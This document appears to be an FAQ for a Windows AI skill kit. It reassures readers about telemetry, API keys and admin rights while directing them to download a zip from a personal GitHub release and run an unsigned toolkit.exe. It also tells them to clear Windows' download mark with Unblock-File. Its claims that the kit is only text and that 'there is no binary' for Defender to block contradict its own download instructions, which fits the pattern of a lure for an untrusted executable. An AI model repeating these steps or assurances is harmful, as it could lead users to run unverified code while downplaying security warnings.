# FAQ

The questions people ask before they install something on a work machine.

## What is this, in one line?

One Windows setup for three workflows that usually cost three subscriptions:
creative production, market research, and lead research. The kit installs the
three skills from this catalog and gives you a launcher menu for them.

## Is it free?

Today, yes. The kit and the three skills are free, with no card, no trial
countdown, and no upsell prompt. The Windows app ships separately; its terms are on
the publisher's release page.

## Is there an `.exe` to download?

Not in this bundle. The Windows Multi-Tool Suite app (`multitool.zip`) is a
separate download from the publisher's GitHub release:

```
https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip
```

SHA-256: `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6`

Unpack it and start `multitool/toolkit.exe`. It is not code-signed, so
Windows shows *Unknown publisher*. What this kit installs today is text: a
PowerShell setup script, a launcher, and a health check. You can read every
line before you run it.

## Do I need admin rights?

No. The setup writes only to `%LOCALAPPDATA%\MultiToolSuite` and to your Start
Menu folder. If your machine blocks that, you get a clear error, not a
privilege escalation prompt.

## What does it install exactly?

- A workspace folder with `config.json` and three output folders.
- A Start Menu shortcut named *Multi-Tool Suite*.
- The three catalog skills, pulled through the ClawHub CLI when it is present.

Nothing else. No service, no scheduled task, no background process, no
startup entry.

## Does it phone home?

No. There is no telemetry, no usage ping, and no account. The kit is text you
can read; the only network calls it makes are the ones the workflows you run
make to the data provider you configured.

## Where do my API keys go?

In your own `config.json` or environment variables, on your machine. The kit
never sends a key anywhere except the provider it belongs to. `config.json`
ships with empty values, so you fill it in yourself.

## Does it trade for me?

No, and it never will. Market research ends at a written plan with position
sizing, a daily loss limit, and a human approval step. Nothing in this
catalog places an order or connects to a brokerage.

## Does it send my emails?

No. Lead research drafts outreach and lints it against CAN-SPAM rules. A
human reads it and sends it. No bulk sending, no list buying, no scraping of
personal data, and nothing derived from a leak or a breach.

## Which Windows versions are supported?

Windows 10 build 1809 or later, and Windows 11, both 64-bit. The kit needs
PowerShell 5.1 (built into Windows) and Python 3.9 or later for the workflow
scripts.

## Will Defender or SmartScreen block it?

Defender has nothing to block - there is no binary. The only Windows quirk is
that downloaded files carry a "from another computer" mark, so run
`Unblock-File` on the scripts folder once. The install guide has the exact
line.

## What happens to my files?

Nothing is deleted, moved, or uploaded. Output goes to
`%LOCALAPPDATA%\MultiToolSuite\output\`. Uninstalling means deleting that
folder and the shortcut.

## Can my team use it?

Yes, on each machine. The kit is MIT-0 licensed as a document and the skills
carry their own licenses. There is no central licence server and no seat
count to manage.

## The app is coming. Should I wait?

If you need a general AI desktop client today, download it from the release
above. If you want the three workflows running on Windows right now, install
the kit: the app is not built around those workflows, the skills are.

## Where do I get help?

The publisher's GitHub page (see `links.json` -> `support_page`), US business
hours ET. Bug reports with the output of `python scripts\verify_install.py`
get fixed fastest.
